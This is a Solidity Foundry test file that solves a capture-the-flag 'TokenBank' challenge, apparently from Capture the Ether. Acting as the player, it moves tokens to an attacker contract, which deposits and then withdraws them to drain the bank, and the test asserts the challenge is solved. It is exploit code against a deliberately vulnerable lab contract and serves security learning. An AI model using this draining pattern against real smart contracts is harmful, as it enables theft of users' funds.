// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here
        // the address of test has 500000 tokens in bank.
        // the player of test has 500000 tokens in bank.
        // the bank has all many tokens in token.
        // player 
        vm.startPrank(player);
        // I am player. I want to use attacker to attack bank. But attacker can't withdraw from the bank because it has not deposit in it.
        // I transfer my token in bank to attacker, so that the attacker can withdraw from the bank.
        uint playerBalanceInBank = tokenBankChallenge.balanceOf(player);
        tokenBankChallenge.withdraw(playerBalanceInBank);  // player withdraw all balance.
        // Token: bank -> player playerBalance
        // Token: player -> attacker playerBalance
        tokenBankChallenge.token().transfer(address(tokenBankAttacker), playerBalanceInBank);
        // Token: attacker -> bank playerBalance
        tokenBankAttacker.depositToBank(playerBalanceInBank); // bank.balanceOf(attacker)
        // start withdraw
        tokenBankAttacker.withdraw(playerBalanceInBank);
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
